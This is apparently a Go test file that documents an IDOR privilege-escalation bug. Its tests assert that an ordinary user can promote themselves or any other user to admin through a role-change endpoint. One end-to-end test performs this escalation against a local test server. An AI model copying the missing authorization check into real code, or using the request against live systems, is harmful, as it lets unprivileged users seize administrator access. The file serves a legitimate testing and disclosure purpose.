package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"testing"

	"golang.org/x/crypto/bcrypt"
)

// TestCanChangeRole_DocumentsIDORBug directly exercises the pulled-out
// authorization function and shows the bug: a plain "user" role caller is
// allowed to promote an arbitrary *other* user's id to "admin". A correct
// implementation would require caller.Role == "admin" here; this one
// doesn't check it at all.
func TestCanChangeRole_DocumentsIDORBug(t *testing.T) {
	lowPrivCaller := User{ID: 42, Username: "alice", Role: "user"}
	someoneElsesID := int64(999)

	if !canChangeRole(lowPrivCaller, someoneElsesID, "admin") {
		t.Fatalf("expected the IDOR bug: a plain 'user' should (incorrectly) be allowed to set an arbitrary other user's role to admin")
	}
	if !canChangeRole(lowPrivCaller, lowPrivCaller.ID, "admin") {
		t.Fatalf("expected the IDOR bug: a plain 'user' should (incorrectly) be allowed to self-promote to admin")
	}

	// Only the newRole value is validated; nothing about the caller's own
	// privilege matters.
	if canChangeRole(lowPrivCaller, someoneElsesID, "superuser") {
		t.Fatalf("canChangeRole should reject unknown role values regardless of caller")
	}
}

func hashPassword(t *testing.T, plaintext string) string {
	t.Helper()
	h, err := bcrypt.GenerateFromPassword([]byte(plaintext), bcrypt.MinCost)
	if err != nil {
		t.Fatalf("hashing password: %v", err)
	}
	return string(h)
}

func doJSON(t *testing.T, client *http.Client, method, url, token string, body any) (*http.Response, map[string]any) {
	t.Helper()
	var reader *bytes.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			t.Fatalf("marshal body: %v", err)
		}
		reader = bytes.NewReader(b)
	} else {
		reader = bytes.NewReader(nil)
	}
	req, err := http.NewRequest(method, url, reader)
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("X-Session-Token", token)
	}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("do request: %v", err)
	}
	defer resp.Body.Close()

	var out map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&out)
	return resp, out
}

// TestEndToEnd_SelfPromotionViaIDOR logs in as a plain "user" against a
// real httptest server + memStore, then shows that calling
// POST /api/users/{own_id}/role with {"role":"admin"} succeeds and that
// GET /api/me subsequently reflects the escalated role — i.e. a regular
// user can silently self-promote to admin with no admin check anywhere in
// the request path.
func TestEndToEnd_SelfPromotionViaIDOR(t *testing.T) {
	store := newMemStore()
	plaintext := "correct horse battery staple"
	seeded := store.seedUser(User{
		Username:     "bob",
		PasswordHash: hashPassword(t, plaintext),
		Role:         "user",
	})

	srv := newServer(store)
	ts := httptest.NewServer(srv.routes())
	defer ts.Close()

	client := ts.Client()

	// Log in for real (no backdoor) as a plain user.
	loginResp, loginBody := doJSON(t, client, http.MethodPost, ts.URL+"/login", "", loginRequest{
		Username: "bob",
		Password: plaintext,
	})
	if loginResp.StatusCode != http.StatusOK {
		t.Fatalf("login: expected 200, got %d (%v)", loginResp.StatusCode, loginBody)
	}
	token, _ := loginBody["token"].(string)
	if token == "" {
		t.Fatalf("login: expected a session token, got %v", loginBody)
	}

	// Sanity check: freshly logged-in user is a plain "user".
	meResp, meBody := doJSON(t, client, http.MethodGet, ts.URL+"/api/me", token, nil)
	if meResp.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/me: expected 200, got %d", meResp.StatusCode)
	}
	if meBody["role"] != "user" {
		t.Fatalf("expected initial role 'user', got %v", meBody["role"])
	}

	// The exploit: call the role-change endpoint on our OWN id, escalating
	// to admin. A correctly-authorized server would reject this because
	// the caller isn't already an admin.
	roleURL := ts.URL + "/api/users/" + strconv.FormatInt(seeded.ID, 10) + "/role"
	roleResp, roleBody := doJSON(t, client, http.MethodPost, roleURL, token, roleChangeRequest{Role: "admin"})
	if roleResp.StatusCode != http.StatusOK {
		t.Fatalf("expected the IDOR to succeed with 200, got %d (%v)", roleResp.StatusCode, roleBody)
	}
	if roleBody["role"] != "admin" {
		t.Fatalf("expected role change response to report 'admin', got %v", roleBody)
	}

	// Confirm the escalation actually stuck.
	meResp2, meBody2 := doJSON(t, client, http.MethodGet, ts.URL+"/api/me", token, nil)
	if meResp2.StatusCode != http.StatusOK {
		t.Fatalf("GET /api/me after escalation: expected 200, got %d", meResp2.StatusCode)
	}
	if meBody2["role"] != "admin" {
		t.Fatalf("expected escalated role 'admin' on /api/me, got %v", meBody2["role"])
	}
}

// TestUnauthenticated_CannotChangeRole is a control: with no session token
// at all, the endpoint still correctly rejects the request. The bug is
// specifically the missing *authorization* check for authenticated callers,
// not a missing *authentication* check.
func TestUnauthenticated_CannotChangeRole(t *testing.T) {
	store := newMemStore()
	store.seedUser(User{Username: "eve", PasswordHash: hashPassword(t, "whatever"), Role: "user"})

	srv := newServer(store)
	ts := httptest.NewServer(srv.routes())
	defer ts.Close()

	client := ts.Client()
	resp, _ := doJSON(t, client, http.MethodPost, ts.URL+"/api/users/1/role", "", roleChangeRequest{Role: "admin"})
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 with no session token, got %d", resp.StatusCode)
	}
}
